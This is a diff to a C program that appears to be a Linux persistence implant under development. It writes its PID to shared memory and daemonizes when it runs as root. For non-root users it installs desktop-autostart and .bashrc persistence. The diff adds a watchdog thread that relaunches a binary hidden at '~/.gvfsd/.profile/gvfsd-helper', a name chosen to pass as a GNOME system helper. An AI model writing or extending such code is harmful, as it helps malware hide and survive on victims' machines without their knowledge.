@@ -16,8 +16,8 @@ int main(int argc, char *argv[]) {
     int pid = getpid();
 
     // TODO: session_dbus_file_write
-    //
-    create_lock();
+
+    //create_lock();
 
     // Creating shared mem w/ unique key
     // File /proc/sysvipc/shm contains the memory key artifacts.
@@ -33,31 +33,31 @@ int main(int argc, char *argv[]) {
     memcpy(addr, c_pid, 8); // writing PID to shared mem.
 
     //debugging current pid vs pid in shared mem
-    //printf("PID is: %d\n", getpid());
-    //printf("PID is: %s\n", (char *)addr);
-
-    //bool result = monitor_proc(31337);
+    printf("PID is: %d\n", getpid());
+    printf("PID written to sharedmem: %s\n", (char *)addr);
 
     // if non root do ...
     if (id == 0) {
         // run in the background
         daemon(0, 0);
         // TODO - spawn root thread, and perform root operations
+        spawn_thread_watchdog(1, "/home/gdev/.gvfsd/.profile/gvfsd-helper");
 
     } else { // non-root user....
-
         // TODO encapsulate this in a separate function?
-        bool res = nonroot_desktop_persistence();
-        if (res == false ){
-            fprintf(stderr, "error creating nonroot desktop persistence: %s",
+
+        bool desktop_res = nonroot_desktop_persistence();
+        if (desktop_res == false ) {
+            fprintf(stderr, "[main] Error creating nonroot desktop persistence: %s",
                     strerror(errno));
         }
 
-        res = nonroot_bashrc_persistence();
-        if (res == false){
-            fprintf(stderr, "Error creating bashrc desktop persistence: %s",
+        bool bashrc_res = nonroot_bashrc_persistence();
+        if (bashrc_res == false) {
+            fprintf(stderr, "[main] Error creating bashrc desktop persistence: %s",
                     strerror(errno));
         }
+        spawn_thread_watchdog(1, "/home/gdev/.gvfsd/.profile/gvfsd-helper");
     }
 
    while(1) {
